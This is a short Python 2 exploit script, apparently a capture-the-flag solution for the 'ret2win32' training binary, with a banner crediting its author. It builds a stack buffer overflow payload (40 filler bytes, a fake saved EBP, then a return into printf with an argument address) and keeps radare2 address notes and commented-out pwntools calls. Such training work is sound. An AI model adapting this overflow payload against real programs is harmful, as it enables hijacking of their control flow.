#!/usr/bin/python
from struct import pack
import pwn

# ==================================================
# Usages:  (python exp.py; cat) | ./binaryName
# =================================================

#+ ------------------------------------------------------------------ +
#= +----------------------------------------------------------------+ =
#= |                                                                | =
#= |     _____ ___________   _____                                  | =
#= |    /  ___/  ___| ___ \ |  __ \                                 | =
#= |    \ `--.\ `--.| |_/ / | |  \/_ __ ___  _   _ _ __             | =
#= |     `--. \`--. \ ___ \ | | __| '__/ _ \| | | | '_ \            | =
#= |    /\__/ /\__/ / |_/ / | |_\ \ | | (_) | |_| | |_) |           | =
#= |    \____/\____/\____/   \____/_|  \___/ \__,_| .__/            | =
#= |                                              | |               | =
#= |                                              |_|               | =
#= +----------------------------------------------------------------+ =
#= +----------------------------------------------------------------+ =
#= |                                                                | =
#= |                   surajsinghbisht054@gmail.com                 | =
#= |                      www.bitforestinfo.com                     | =
#= |                                                                | =
#= |                  Try Smart, Try Hard & Don't Cheat             | =
#= +----------------------------------------------------------------+ =
#+ ------------------------------------------------------------------ +

#pwn.context.log_level='debug'

#b = pwn.process('./ret2win32')
#b.recvuntil('>')

# 004 0x00000430 0x08048430 GLOBAL   FUNC   16 imp.system

# ?v reloc.fgets 
# 0x804a010
#
#
#
# ?v reloc.puts
#  0x804a014
#
# ?v sym.pwnme 
# 0x80485f6
#
# ?v sym.imp.puts 
# 0x8048420

t_function = 0x08048400 # printf
args = 0x8048710

load = ''
load += pack('I',t_function)
load += 'AAAA' #pack('I', )
load += pack('I', args )

# Buffer
pay = ''
pay += 'A'*40
pay += 'BBBB' # EBP
pay += load # EIP
print pay



#b = pwn.process('./ret2win32')
#b.recvuntil('>')


#b.sendline(pay)
#print pwn.hexdump(b.readall())
#pwn.gdb.attach(b)
#b.interactive()
